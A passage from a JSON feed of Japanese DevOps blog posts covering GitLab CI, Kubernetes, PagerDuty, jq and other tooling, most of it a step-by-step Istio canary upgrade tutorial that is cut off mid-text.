expire_in: 30 mins reports: dotenv: dot.env needs: - job: job1 artifacts: true# needs で指定しているので MY_VAR1 も MY_VAR2 も渡されるjob3_1: stage: stage3 script: - echo \\"MY_VAR1=$MY_VAR1\\" - echo \\"MY_VAR2=$MY_VAR2\\" needs: - job: job1 artifacts: true - job: job2 artifacts: true# needs で job1 だけを指定しているので MY_VAR1 だけ渡されるjob3_2: stage: stage3 script: - echo \\"MY_VAR1=$MY_VAR1\\" - echo \\"MY_VAR2=$MY_VAR2\\" needs: - job: job1 artifacts: true# needs を指定しないと MY_VAR1 も MY_VAR2 も両方渡されるjob3_3: stage: stage3 script: - echo \\"MY_VAR1=$MY_VAR1\\" - echo \\"MY_VAR2=$MY_VAR2\\"# needs で job1 が指定されているが artifacts は false なので# MY_VAR1 も MY_VAR2 も渡されないjob3_4: stage: stage3 script: - echo \\"MY_VAR1=$MY_VAR1\\" - echo \\"MY_VAR2=$MY_VAR2\\" needs: - job: job1 artifacts: false# MY_VAR2 だけ受け取れるjob3_5: stage: stage3 script: - echo \\"MY_VAR1=$MY_VAR1\\" - echo \\"MY_VAR2=$MY_VAR2\\" needs: - job: job1 artifacts: false - job: job2 artifacts: truehttps://gitlab.com/gitlab-org/gitlab/-/issues/22638","isoDate":"2023-04-04T16:27:22.000Z","dateMiliSeconds":1680625642000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Orbstack を Docker Desktop の代わりに使う","link":"https://blog.1q77.com/2023/04/orbstack/","contentSnippet":"きっかけbrew update して新しく追加された formula を眺めるのが最近のちょっとした楽しみ— yteraoka (@yteraoka) January 12, 2023で、orbstack っていう formula が追加されてるのを見てほー、そんなものが、ということで試してみる。","isoDate":"2023-04-04T13:17:51.000Z","dateMiliSeconds":1680614271000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"kube-proxy の externalTrafficPolicy=Local の改善","link":"https://zenn.dev/toversus/articles/6eeb3b708bdff3","contentSnippet":"tl;dr;Service type LoadBalancer の externalTrafficPolicy: Local は、Kubernetes 1.26 まで Pod のローリング更新時にトラフィックが喪失する問題があるので注意kubernetes-sigs/cloud-provider-kind は、ローカル環境でクラウドリソース (現在は LB のみ) が絡む処理をシミュレートできて便利GKE Dataplane v2 を利用している場合、GKE 1.26.1 時点で Cilium に externalTrafficPolicy: Local の改善が入ってい...","isoDate":"2023-03-29T01:31:20.000Z","dateMiliSeconds":1680053480000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"PagerDuty で一定期間アラートを抑制する","link":"https://zenn.dev/toshikish/articles/6958af565e6c65","contentSnippet":"PagerDuty でアラートを受け取っているプロジェクトで，以下のようにある時間帯はアラートを止めたいケースがあります。メンテナンスが予定されている。開発環境は営業時間内だけ動かすので，平日夜や土日祝日は止めたい。何も対策しないとアラートが鳴ってしまい，オンコール担当者を不用意に呼び出す結果になるので，そうならないようにきちんと設定します。 TL;DR各ケースで以下のように設定します。メンテナンス→メンテナンスウィンドウを設定平日夜・土日停止→曜日・時刻ベースのイベントルールを追加 方法1：メンテナンスウィンドウメンテナンスなどでダウンする時間帯があらかじ...","isoDate":"2023-03-27T08:38:39.000Z","dateMiliSeconds":1679906319000,"authorName":"toshikish","authorId":"toshikish"},{"title":"jq commandの select でハマった話","link":"https://zenn.dev/satohjohn/articles/79faafa55e9a1e","contentSnippet":"結論配列のjsonに対してselectする際には、配列を一度オブジェクトの抽出をしないと複製されてしまう。なので、以下ではなくjq -r  \'select(.[].A | contains(\\"特定文字列\\")) | .[].B\' test.jsonこうしないといけないjq -r  \'.[] | select(.A | contains(\\"特定文字列\\")) | .B\' test.json 環境$ jq --version   jq-1.6 詰まった内容以下のjson(test.json)があったときにtest.json[    {        \\"hog...","isoDate":"2023-03-25T16:36:44.000Z","dateMiliSeconds":1679762204000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"ふと、思いだしたときに確認するって大事ですね、という話","link":"https://zenn.dev/nedoko_dok0dko/articles/174811e1685df2","contentSnippet":"本日、こんなお知らせが流れてきた。We updated our RSA SSH host key「そういえば、プライベートのPCでRSA使ってた…」と思い出したので、確認。$ ssh -T git@github.com@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@IT I...","isoDate":"2023-03-24T13:27:59.000Z","dateMiliSeconds":1679664479000,"authorName":"seno","authorId":"seno"},{"title":"Kubernetes と名前解決","link":"https://zenn.dev/toversus/articles/d9faba80f68ea2","contentSnippet":"tl;dr外部サービスのホスト名の末尾に . (ドット) を必ず指定しましょう。✅\xa0google.com.❌\xa0google.com末尾にドットを指定できない (e.g. SDK 組み込み) かつ大量の名前解決が発生している場合は、Pod の DNS Config の options で ndots: 1 を指定しましょう。Kubernetes の名前解決の仕組みを理解していないと、各ノードの conntrack テーブルが溢れてパケットが破棄され、サービスに影響が出ることがあります。 背景アプリケーションが外部のサービスを呼び出す場合、ホスト名を IP アド...","isoDate":"2023-03-22T07:36:38.000Z","dateMiliSeconds":1679470598000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"cloud runの要らなくなったリビジョンを消す","link":"https://zenn.dev/satohjohn/articles/2a769b8280427d","contentSnippet":"小ネタです。運用をしていて、たくさんリリースしているとリビジョンが増えていることとかもあるかなと思いますが、コンソール上から消すのも面倒なので、コマンドで消しましょう。というか、解説することもないので、結論と詰まった部分だけ残しておきます。 結論 ACTIVEじゃないものをすべて消す#!/bin/bashSERVICE_NAME=$1revisions=$(    gcloud run revisions list --service=$SERVICE_NAME \\\\    --filter=\\"status.conditions.type:Active AND s...","isoDate":"2023-03-21T02:35:43.000Z","dateMiliSeconds":1679366143000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Datadog Agent からの Metrics を Victoria Metrics で受ける","link":"https://blog.1q77.com/2023/03/send-datadog-metrics-to-victoriametrics/","contentSnippet":"Victoria Metrics は v1.67.0 で Datadog Agent からのメトリクスを受け取れるようになっているので今回はこれを試してみる。Victoria Metrics のドキュメント How to send data from DataDog agentSingle node Instance をセットアップVictoria Metrics はクラスタリング構成も可能だが今回は Single node のサーバーで検証。","isoDate":"2023-03-19T12:38:04.000Z","dateMiliSeconds":1679229484000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Azure Bicep で Storage Account の SSE を設定する","link":"https://zenn.dev/kyohei_saito/articles/fb102fd2af31e2","contentSnippet":"Azure Bicep で Storage Account の SSE (サーバー側暗号化) を設定してみようとしたところ、思ったより難しかったのと、やりたいことそのままのサンプルコードがなかったため、調査した内容を公開してみます。 この記事で書いてあることAzure Bicep を使用して Storage Account の SSE を設定する方法 サンプルコード早く使い方とコードを見たい、という方向けにまずはサンプル コードについて記載します。この記事で説明するサンプル コードの全体は下記を参照ください。https://github.com/kiyo-s/crea...","isoDate":"2023-03-19T04:44:58.000Z","dateMiliSeconds":1679201098000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"k8s.gcr.io の凍結対応から学んだことメモ","link":"https://zenn.dev/kyohei_saito/articles/d0080d94dae0b7","contentSnippet":"今まで Kubernetes プロジェクトのコンテナ イメージをホストしていたイメージ レジストリ k8s.gcr.io が凍結されることが発表されました。この記事では、k8s.gcr.io から registry.k8s.io に移行する過程で学んだことについて、備忘としてメモします。 この記事で書いてあることk8s.gcr.io から registry.k8s.io に移行した流れhelm で、dependencies によって外部の chart を install している場合に、外部の chart の values を設定する方法skopeo によりローカルで ...","isoDate":"2023-03-18T19:08:14.000Z","dateMiliSeconds":1679166494000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"[Terraform] aws_networkfirewall_firewall リソースから VPC エンドポイント ID を取り出す","link":"https://zenn.dev/toshikish/articles/fc08c2021811f9","contentSnippet":"はじめにTerraform を使って AWS Network Firewall のファイアウォールを作るとき，生成された VPC エンドポイントの ID をサブネットのルートテーブルのルートに追加するのは自然な流れですが，VPC エンドポイント ID を取り出すのが大変だったので，やり方を記録しておきます。例えば以下のように aws_networkfirewall_firewall リソースを定義したとします。（特に説明のない変数やリソースは，なんとなくの理解で構いません。）resource \\"aws_networkfirewall_firewall\\" \\"firewall\\" ...","isoDate":"2023-03-16T07:58:23.000Z","dateMiliSeconds":1678953503000,"authorName":"toshikish","authorId":"toshikish"},{"title":"ビットコイン・ライトニングネットワーク概論","link":"https://speakerdeck.com/shukob/bitutokoinraitoningunetutowakugai-lun-749a7a47-5e72-4585-bcfd-40e8643a7143","contentSnippet":"https://event.ospn.jp/osc2023-online-spring/session/809175\\rビットコインは送金トランザクションの処理量に限界があり、ブロックチェーンの外での送金を行うオフチェーン技術により手数料の軽減と、送金の高速化を実現できます。\\r\\rオフチェーンの中でもビットコインと同様、中央管理者のいないライトニングネットワークの開発が進んでいます。\\r\\rライトニングネットワーク技術の骨格をまとめました。","isoDate":"2023-03-11T05:00:00.000Z","dateMiliSeconds":1678510800000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"振り返り (2020 - 2022)","link":"https://zenn.dev/toversus/articles/8557a7fb2bc15c","contentSnippet":"コロプラに 2020/3/1 に入社して、2023/2/28 付けで退職したので、丸々 3 年間勤務したことになります。本当の意味での大規模 Kubernetes 環境で貴重な経験をさせて貰い感謝しかないです。記憶が新しい内に、この 3 年間でやってきたことを公開できる範囲で整理しました。 GitOps 風なマニフェスト管理への移行インフラチームで管理している監視ツールやアドオンなコンポーネントを Helm でインストールしていました。マルチクラスタな環境で手動インストールはスケールしないので、Helmfile で生成した各クラスタのマニフェストを Argo CD で同期する方式に...","isoDate":"2023-03-05T14:17:49.000Z","dateMiliSeconds":1678025869000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"Devbox を使った開発環境","link":"https://blog.1q77.com/2023/03/devbox/","contentSnippet":"ローカル環境を汚さずDockerコンテナのオーバーヘッドもなく、開発環境を自在に構築できる「Devbox 0.2.0」登場 － Publickeyこの記事を最初に見たときは「えーそんなのコンテナじゃないじゃん」とか思って不要じゃね？って思ってたんですが、Rails を少し触ることになって macOS 上での docker の遅さに辟易してきたので devbox を思い出し、使ってみることにしました。","isoDate":"2023-03-04T15:05:12.000Z","dateMiliSeconds":1677942312000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"2023年もSRE再考と叫びなさい‼️","link":"https://speakerdeck.com/nwiizo/2023nian-mosrezai-kao-tojiao-binasai","contentSnippet":"2023年もSRE再考と叫びなさい‼️ SREの跡を求めず SREの求めたるところを求めよ というタイトルで登壇してきました\\r\\r2023年3月3日 エンジニア文化祭 2023\\rhttps://forkwell.connpass.com/event/272596/\\r\\r『2023年もSRE再考と叫びなさい!!』というタイトルで登壇しました - じゃあ、おうちで学べる\\rhttps://syu-m-5151.hatenablog.com/entry/2023/03/03/105049","isoDate":"2023-03-03T05:00:00.000Z","dateMiliSeconds":1677819600000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Insertモードでも気軽に←・→したい","link":"https://blog.atusy.net/2023/03/03/horizontal-arrows-on-insert/","contentSnippet":"本記事は3/3のVim 駅伝の記事です1。概要通常、Vim/NeovimのInsertモードで←や→を使うと、Undo blockが途切れます。これではUndoやドットリピートが直感に反するケースがあるので、以下のようにマッピングしておくと便利です。Insertモード中で水平移動してタイポ修正する人や、自動入力された閉括弧の外側へ→で移動した後、NormalモードでUndoやドットリピートする時に活躍します。","isoDate":"2023-03-03T00:00:00.000Z","dateMiliSeconds":1677801600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Snowflakeでのコスト管理","link":"https://zenn.dev/nedoko_dok0dko/articles/ffe6450c4cd851","contentSnippet":"Snowflakeを最近触ってみることがあったので、コスト周りについて個人的に調べたログ参考ドキュメント↓Snowflakeでのコスト管理 | Snowflake Documentation お品書きSnowflakeのコストについてSnowflakeのコスト調査Snowflakeのコスト制御 SnowflakeのコストについてSnowflakeでのコストは次の3つの領域に分類される。コンピューティング: ユーザー管理(仮想ウェアハウス)、Snowflake管理(Snowpipeなどのサーバーレス機能)、およびクラウドサービスストレージ: データステージング...","isoDate":"2023-02-28T10:45:26.000Z","dateMiliSeconds":1677581126000,"authorName":"seno","authorId":"seno"},{"title":"【Istio⛵️】Istioを安全にアップグレードするカナリア方式とその仕組み","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/02/26/202548","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️Istioのアップグレード手法の種類について安全なカナリア方式の仕組みについてこの記事から得られる知識01. はじめに02. なぜ安全なアップグレードが必要なのか起こりうる問題採用するべきアップグレード手法03. アップグレード手法を説明する前にカナリアリリースとはカナリアリリースの手順(1) 新環境のリリース(2) 新環境への重み付けルーティング(3) 実地的テストの実施(4) 重み付けの段階的変更『カナリアリリース』の呼称の由来04. アップグレード手法の概要(1) アップグレード前の検証(2) 新Istiodのインストール(3) Webhookの宛先のServiceの変更(4) Istio IngressGatewayをインプレースアップグレード(5) 一部のNamespaceのistio-proxyコンテナをアップグレード(6) ユーザの手を借りたテスト(7) istio-proxyコンテナの段階的アップグレード(8) 旧Istiodのアンインストール05. アップグレード手法の詳細istioctl コマンドを使用したアップグレード前提NamespaceIstiodIstio IngressGatewayマイクロサービス(1) アップグレード前の検証ここで実施することistioctl x precheckコマンドkubectl getコマンド▼ IstiodのDeployment▼ Webhookの宛先のService▼ 宛先のServiceを決めるMutatingWebhookConfiguration(2) 新Istiodのインストールここで実施することistioctl versionコマンドistioctl installコマンドkubectl getコマンド▼ IstiodのDeployment▼ Webhookの宛先のService▼ Webhookの宛先のServiceを決めるMutatingWebhookConfiguration(3) Webhookの宛先のServiceの変更ここで実施することistioctl tag setコマンド(4) Istio IngressGatewayをインプレースアップグレードここで実施することkubectl rollout restartコマンド(5) 一部のNamespaceのistio-proxyコンテナをアップグレードここで実施することkubectl rollout restartコマンド(6) ユーザの手を借りたテストここで実施することもし問題が起こった場合(7) istio-proxyコンテナの段階的アップグレードここで実施することkubectl rollout restartコマンド(8) 旧Istiodのアンインストールここで実施することistioctl uninstallコマンドkubectl getコマンド▼ IstiodのDeployment▼ Webhookの宛先のService▼ 宛先のServiceを決めるMutatingWebhookConfiguration06. おわりに記事関連のおすすめ書籍01. はじめに隠しません。有吉弘行のサンデーナイトドリーマー は人生のバイブルです。さて、最近の業務でIstio⛵️をひたすらアップグレードしています。今回は、採用したアップグレード手法の紹介も兼ねて、Istioの安全なアップグレード手法の仕組みを記事で解説しました。Istioのアップグレード手法には変遷があり、解説するのは執筆時点 (2023/02/26) で最新の 1.14 系のアップグレード手法です。それでは、もりもり布教していきます\uD83D\uDE1702. なぜ安全なアップグレードが必要なのか起こりうる問題そもそも、なぜIstioで安全なアップグレードを採用する必要があるのでしょうか。Istioで問題が起こると、Pod内のistio-proxyコンテナが正しく稼働せず、システムに大きな影響を与える可能性があります。例えば、istio-proxyコンテナのPodへのインジェクションがずっと完了せず、アプリコンテナへの通信が全て遮断されるといったことが起こることがあります。採用するべきアップグレード手法執筆時点 (2023/02/26) では、Istiodコントロールプレーン (以降、Istiodとします) のアップグレード手法には、『インプレース方式』と『カナリア方式』があります。また合わせてアップグレードが必要なIstio IngressGatewayには、その手法に『インプレース方式』があります。今回の安全なアップグレード手法として、Istiodでは『カナリアアップグレード』、Istio IngressGatewayでは『インプレースアップグレード』を採用します。Istio / Canary UpgradesIstio / Installing Gateways03. アップグレード手法を説明する前にカナリアリリースとはIstiodのカナリアアップグレードが理解しやすくなるように、カナリアリリースから説明したいと思います。カナリアリリースは、実際のユーザーにテストしてもらいながらリリースする手法です。もしカナリアリリースをご存知の方は、 04. アップグレード手法の概要 まで飛ばしてください\uD83D\uDE47\uD83C\uDFFB‍カナリアリリースの手順カナリアリリースは、一部のユーザーを犠牲にすることになる一方で、アプリを実地的にテストできる点で優れています。手順を交えながら説明します。Canary Release(1) 新環境のリリース旧環境のアプリを残したまま、新環境をリリースします。この段階では、全てのユーザー (100%) を旧環境にルーティングします。(2) 新環境への重み付けルーティングロードバランサーで重み付けを変更し、一部のユーザー (ここでは10%) を新環境にルーティングします。(3) 実地的テストの実施ユーザーの手を借りて新環境を実地的にテストします (例：該当のエラーメトリクスが基準値を満たすか) 。(4) 重み付けの段階的変更新環境に問題が起こらなければ、重み付けを段階的に変更し、最終的には全てのユーザー (100%) を新環境にルーティングします。『カナリアリリース』の呼称の由来カナリアリリースについては、その呼称の由来を知ると、より理解が深まります。カナリアリリースは、20世紀頃の炭坑労働者の危機察知方法に由来します。炭鉱内には有毒な一酸化炭素が発生する場所がありますが、これは無色無臭なため、気づくことに遅れる可能性があります。そこで当時の炭鉱労働者は、一酸化炭素に敏感な『カナリア』を炭鉱内に持ち込み、カナリアの様子から一酸化炭素の存在を察知するようにしていたそうです。つまり、先ほどの『犠牲になる一部のユーザー』が、ここでいうカナリアというわけです\uD83D\uDE28画像引用元：George McCaa, U.S. Bureau of MinesAbout canary deployment in simple words04. アップグレード手法の概要カナリアリリースを理解したところで、Istioの安全なアップグレード手法の概要を説明します。おおよそ以下の手順からなります。なお各番号は、05. アップグレード手法の詳細 の (1) 〜 (8) に対応しています。(1) アップグレード前の検証旧Istiodが稼働しています。ここで、アップグレードが可能かどうかを検証しておきます。(2) 新Istiodのインストール新Istiod (discoveryコンテナ) をインストールします。(3) Webhookの宛先のServiceの変更新Istiodのistio-proxyコンテナをインジェクションできるように、Webhookの宛先のServiceを変更します。この手順は重要で、後の  (3) Webhookの宛先のServiceの変更 で詳細を説明しています。(4) Istio IngressGatewayをインプレースアップグレードIstio IngressGatewayをインプレースアップグレードします。(5) 一部のNamespaceのistio-proxyコンテナをアップグレード一部のNamespaceで、istio-proxyコンテナをカナリアアップグレードします。▶︎ 『カナリアアップグレード』の呼称についてistio-proxyコンテナを一斉にアップグレードするのではなく、段階的にアップグレードしていく様子を『カナリア』と呼称している、と個人的に推測しています。もし『カナリアアップグレード』の由来をご存じの方は、ぜひ教えていただけると\uD83D\uDE47\uD83C\uDFFB‍(6) ユーザの手を借りたテストユーザーの手を借りて、実地的にテストします (例：該当のエラーメトリクスが基準値以下を満たすか) 。(7) istio-proxyコンテナの段階的アップグレード新Istiodのistio-proxyコンテナに問題が起こらなければ、他のNamespaceでもistio-proxyコンテナを段階的にカナリアアップグレードしていきます。一方でもし問題が起これば、Namespaceのistio-proxyコンテナとIstio IngressGatewayをダウングレードします。(8) 旧Istiodのアンインストール最後に、旧Istiodをアンインストールします。Istio / Canary Upgrades05. アップグレード手法の詳細istioctl コマンドを使用したアップグレードここからは、04. アップグレード手法の概要 を深ぼっていきます。今回は、ドキュメントで一番優先して記載されている istioctl コマンドを使用した手順 を説明します。なお各番号は、04. アップグレード手法の概要 の (1) 〜 (8) に対応しています。▶︎ アップグレードに使用するツールについてistioctlコマンド以外のツール (例：helmコマンド、helmfileコマンド、ArgoCD) を使用してもアップグレードできます。細かな手順が異なるだけで、アップグレード手法の概要は同じです\uD83D\uDE46\uD83C\uDFFB‍前提Namespaceまず最初に、前提となる状況を設定しておきます。各Namespaceのistio.io/revラベルにdefaultが設定されているとします。$ kubectl get namespace -L istio.io/revNAME              STATUS   AGE   REVfoo               Active   34d   defaultbar               Active   34d   defaultbaz               Active   34d   defaultistio-ingress     Active   34d   default...▶︎ istio.io/revラベル値のエイリアスについてistio.io/revラベル値は、どんなエイリアスでもよいです。よくあるエイリアスとしてdefaultやstableを使用します\uD83D\uDC4Dさらに、マニフェストに書き起こすと以下のようになっています。apiVersion: v1kind: Namespacemetadata:  name: foo  labels:    istio.io/rev: defaultこのistio.io/revラベルがあることにより、そのNamespaceのPodにistio-proxyコンテナを自動的にインジェクションします。▶︎ istio-proxyコンテナのインジェクションの仕組みについてについてistio-proxyコンテナのインジェクションの仕組みについては、今回言及しておりません。以下の記事で解説していますため、もし気になる方はよろしくどうぞ\uD83D\uDE47\uD83C\uDFFB‍Istiodすでに1-14-6のIstiodが動いており、1-15-4にカナリアアップグレードします。IstiodはDeployment配下のPodであり、このPodはIstiodの実体であるdiscoveryコンテナを持ちます。$ kubectl get deployment -n istio-system -l app=istiodNAME                   READY   UP-TO-DATE   AVAILABLE   AGEistiod-1-14-6          1/1     1            1           47s # 1-14-6Istio IngressGatewayIstio IngressGatewayはIstiodとは異なるNamespaceで動いており、インプレースアップグレードします。Istio IngressGatewayはistio-proxyコンテナを持ちます。$ kubectl get deployment -n istio-ingressNAME                   READY   UP-TO-DATE   AVAILABLE   AGEistio-ingressgateway   1/1     1            1           47s▶︎ IstiodとIstio IngressGatewayを動かすNamespaceについてIstio / Installing Gatewaysマイクロサービス各Namespaceでマイクロサービスが動いています。マイクロサービスのPodはistio-proxyコンテナを持ちます。$ kubectl get deployment -n fooNAME   READY   UP-TO-DATE   AVAILABLE   AGEfoo    2/2     1            1           47s...$ kubectl get deployment -n barNAME   READY   UP-TO-DATE   AVAILABLE   AGEbar    2/2     1            1           47s..$ kubectl get deployment -n bazNAME   READY   UP-TO-DATE   AVAILABLE   AGEbaz    2/2     1            1           47s...(1) アップグレード前の検証ここで実施することアップグレード前に、現在のKubernetes Clusterがアップグレード要件を満たしているかを検証します。Before you upgradeistioctl x precheckコマンドistioctl x precheckコマンドを実行し、アップグレード要件を検証します。問題がなければ、istioctlコマンドはNo issue ...の文言を出力します。$ istioctl x precheck✅ No issues found when checking the cluster.Istiois safe to install or upgrade!  To get started, check out https://istio.io/latest/docs/setup/getting-started/▶︎ アップグレード要件が満たない場合についてistioctl x precheckコマンドはエラー文言を出力します。例えば、Istioのistio-proxyコンテナのインジェクションではkube-apiserverと通信する必要があります。そのため、kube-apiserverのバージョンが古すぎるせいでIstioが非対応であると、エラーになります\uD83D\uDE2Dkubectl getコマンド▼ IstiodのDeploymentkubectl getコマンドを実行し、現在のIstiodのバージョンを確認します\uD83D\uDC40まずはIstiodのDeploymentを確認すると、1-14-6のDeploymentがあります。$ kubectl get deployment -n istio-system -l app=istiodNAME                   READY   UP-TO-DATE   AVAILABLE   AGEistiod-1-14-6          1/1     1            1           47s # 1-14-6istio-proxyコンテナのインジェクションの仕組みでいうと、以下の赤枠の要素です\uD83D\uDC47▼ Webhookの宛先のService次に、 Serviceを確認すると、1-14-6のServiceがあります。$ kubectl get service -n istio-system -l app=istiodNAME            TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                                 AGEistiod-1-14-6   ClusterIP   10.96.93.151     <none>        15010/TCP,15012/TCP,443/TCP,15014/TCP   109s # 1-14-6このServiceは、kube-apiserverからIstiodへのWebhookを仲介することにより、istio-proxyコンテナのインジェクションを可能にします。istio-proxyコンテナのインジェクションの仕組みでいうと、以下の赤枠の要素です\uD83D\uDC47▼ 宛先のServiceを決めるMutatingWebhookConfiguration最後に、MutatingWebhookConfigurationを確認すると、istio-revision-tag-<エイリアス>とistio-sidecar-injector-<リビジョン番号>のMutatingWebhookConfigurationがあります。$ kubectl get mutatingwebhookconfigurationsNAME                            WEBHOOKS   AGEistio-revision-tag-default      2          114s  # カナリアアップグレード用istio-sidecar-injector-1-14-6   2          2m16s # インプレースアップグレード用のため今回は言及しないistio-proxyコンテナのインジェクションの仕組みでいうと、以下の赤枠の要素です\uD83D\uDC47これらのうち、前者 (istio-revision-tag-<エイリアス>) をカナリアアップグレードのために使用します。このMutatingWebhookConfigurationは、Webhookの宛先のServiceを決めるため、結果的にistio-proxyコンテナのバージョンを決めます。ここで、MutatingWebhookConfigurationのistio.io/revラベルとistio.io/tagラベルの値も確認しておきます。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.metadata.labels\'...istio.io/rev: 1-14-6istio.io/tag: default...istio.io/revラベルはIstiodのバージョン、istio.io/tagラベルはこれのエイリアスを表しています。また、.webhooks[].namespaceSelectorキー配下のistio.io/revキーの検知ルールを確認します。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.webhooks[]\'...namespaceSelector:  matchExpressions:    - key: istio.io/rev      operator: In      values:        - default...合わせて、.webhooks[].clientConfig.serviceキー配下のServiceを名前を確認します。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.webhooks[].clientConfig\'...service:  name: istiod-1-14-6...▶︎ MutatingWebhookConfigurationの役割についてistio.io/revラベルにdefaultを設定してあるとします。すると、上記のMutatingWebhookConfigurationがこれを検知します。MutatingWebhookConfigurationにはdefaultに対応するIstioのリビジョンが定義されており、kube-apiserverが特定のIstioのバージョンのServiceにWebhookを送信可能になります\uD83C\uDF89Istio / Safely upgrade the Istio control plane with revisions and tags(2) 新Istiodのインストールここで実施することそれでは、新Istiodをインストールします。Control planeistioctl versionコマンド新しくインストールするIstiodのバージョンは、istioctlコマンドのバージョンで決まります。そこで、istioctl versionコマンドを実行し、これのバージョンを確認します。$ istioctl versionclient version: 1.15.4        # アップグレード先のバージョンcontrol plane version: 1.14.6 # 現在のバージョンdata plane version: 1.14.6istioctl installコマンドカナリアアップグレードの場合、istioctl installコマンドを実行します。ドキュメントではrevisionキーの値がcanaryですが、今回は1-15-4とします。この値は、Istioが使用する様々なKubernetesリソースの接尾辞や、各リソースのistio.io/revラベルの値になります。$ istioctl install --set revision=1-15-4WARNING: Istio is being upgraded from 1.14.6 -> 1.15.4WARNING: Before upgrading, you may wish to use \'istioctl analyze\' to check for IST0002 and IST0135 deprecation warnings.✅ Istio core installed✅ Istiod installed✅ Ingress gateways installed✅ Installation completeThank you for installing Istio 1.15.  Please take a few minutes to tell us about your install/upgrade experience!▶︎ カナリアアップグレードで指定できるバージョン差についてrevisionキーを使用したカナリアアップグレードでは、2つの先のマイナーバージョンまでアップグレードできます。例えば、現在のIstioが1.14.6であるなら、1.16系まで対応しています\uD83D\uDC4DIstio / Canary Upgradeskubectl getコマンド▼ IstiodのDeploymentkubectl getコマンドを実行し、istioctl installコマンドで何をインストールしたのかを確認します\uD83D\uDC40まずはIstiodのDeploymentを確認すると、1-15-4というDeploymentが新しく増えています。$ kubectl get deployment -n istio-system -l app=istiodNAME            READY   UP-TO-DATE   AVAILABLE   AGEistiod-1-14-6   1/1     1            1           47s # 1-14-6istiod-1-15-4   1/1     1            1           47s # 1-15-4接尾辞の1-15-4は、revisionキーの値で決まります。この段階では、旧Istiodと新Istioが並行的に稼働しており、kube-apiserverはまだ旧Istiodと通信しています今の状況は以下の通りです\uD83D\uDC47▼ Webhookの宛先のService次に Webhookの宛先のServiceを確認すると、istiod-1-15-4というServiceが新しく増えています。$ kubectl get service -n istio-system -l app=istiodNAME            TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                                 AGEistiod-1-14-6   ClusterIP   10.96.93.151     <none>        15010/TCP,15012/TCP,443/TCP,15014/TCP   109s # 1-14-6istiod-1-15-4   ClusterIP   10.104.186.250   <none>        15010/TCP,15012/TCP,443/TCP,15014/TCP   87s  # 1-15-4この段階では、まだWebhookの宛先はistiod-1-14-6のServiceです。今の状況は以下の通りです\uD83D\uDC47▼ Webhookの宛先のServiceを決めるMutatingWebhookConfiguration最後にMutatingWebhookConfigurationを確認すると、istio-sidecar-injector-1-15-4というMutatingWebhookConfigurationが新しく増えています。$ kubectl get mutatingwebhookconfigurationsNAME                            WEBHOOKS   AGEistio-revision-tag-default      2          114s  # カナリアアップグレードで使用するistio-sidecar-injector-1-14-6   2          2m16sistio-sidecar-injector-1-15-4   2          2m16sカナリアアップグレードでは、istio-revision-tag-<エイリアス>のMutatingWebhookConfigurationを使用します。今の状況は以下の通りです\uD83D\uDC47▶︎ アンインストールについて(3) Webhookの宛先のServiceの変更ここで実施することこの手順では、エイリアスのistio.io/tagラベルの値はそのままにしておき、一方でistio.io/revラベルの値を変更します。さらに、Webhookの宛先のServiceを変更します。Default tagSafely upgrade the Istio control plane with revisions and tagsistioctl tag setコマンドistioctl tag setコマンドを実行し、istio.io/revラベルの値と宛先のServiceを変更します。$ istioctl tag set default --revision 1-15-4 --overwrite実行後に、もう一度MutatingWebhookConfigurationを確認すると、istio.io/revラベルの値が変わっています。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.metadata.labels\'...istio.io/rev: 1-15-4istio.io/tag: default...また、Webhookの宛先のServiceも変わっています。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.webhooks[].clientConfig\'...service:  name: istiod-1-15-4...これらにより、Webhookの宛先が 1-15-4 のService となります。そのため、 1-15-4 の istio-proxy コンテナをインジェクションできる ようになります。今の状況は以下の通りです\uD83D\uDC47(4) Istio IngressGatewayをインプレースアップグレードここで実施することWebhookの宛先が1-15-4のServiceに変わったところで、Istio IngressGatewayをインプレースアップグレードします。In place upgradekubectl rollout restartコマンドkubectl rollout restartコマンドを実行し、Istio IngressGatewayをインプレースアップグレードします。$ kubectl rollout restart deployment istio-ingressgateway-n istio-ingress再作成したPodのイメージを確認してみると、istio-proxyコンテナを1-15-4にアップグレードできています。$ kubectl get pod bar -n bar -o yaml | yq \'.spec.containers[].image\'docker.io/istio/proxyv2:1.15.4 # istio-proxyコンテナ▶︎ istioctl proxy-statusコマンドについてkubectl getコマンドの代わりに、istioctl proxy-statusコマンドを使用して、アップグレードの完了を確認してもよいです。今の状況は以下の通りです\uD83D\uDC47▶︎ Istio IngressGatewayの通信遮断について(5) 一部のNamespaceのistio-proxyコンテナをアップグレードここで実施すること続けて、一部のNamespaceのistio-proxyコンテナをアップグレードします。Podの再作成により、新Istiodのistio-proxyコンテナがインジェクションされるため。istio-proxyコンテナをアップグレードできます。Data planekubectl rollout restartコマンド前提にあるように、Namespaceには foo bar baz 